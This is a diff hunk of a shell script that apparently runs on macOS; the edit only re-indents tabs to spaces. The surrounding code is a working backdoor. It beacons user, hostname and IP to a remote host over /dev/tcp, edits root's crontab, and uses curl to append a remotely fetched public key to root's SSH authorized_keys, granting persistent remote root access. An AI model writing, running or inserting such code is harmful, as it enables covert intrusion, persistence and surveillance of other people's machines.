@@ -14,13 +14,13 @@ port=2043
 
 ip_new=false
 if ! grep -q "^$ip$" /etc/ips; then
-	echo "$ip" >> /etc/ips
-	ip_new=true
+    echo "$ip" >> /etc/ips
+    ip_new=true
 fi
 
 if [[ $(< /etc/info) != "$user $hostname" || $ip_new = true ]]; then
-	printf "$user $hostname" > /etc/info
-	printf "UPDATE: $info" >/dev/tcp/$host/$port
+    printf "$user $hostname" > /etc/info
+    printf "UPDATE: $info" >/dev/tcp/$host/$port
 fi
 
 grep -v "$host" /var/at/tabs/root > /tmp/crontab
@@ -37,5 +37,5 @@ sshpath="/var/root/.ssh"
 mkdir -p "$sshpath"
 
 if ! grep -q boesene $sshpath/authorized_keys; then
-	curl -L $host:2042/pubkey >> $sshpath/authorized_keys
+    curl -L $host:2042/pubkey >> $sshpath/authorized_keys
 fi
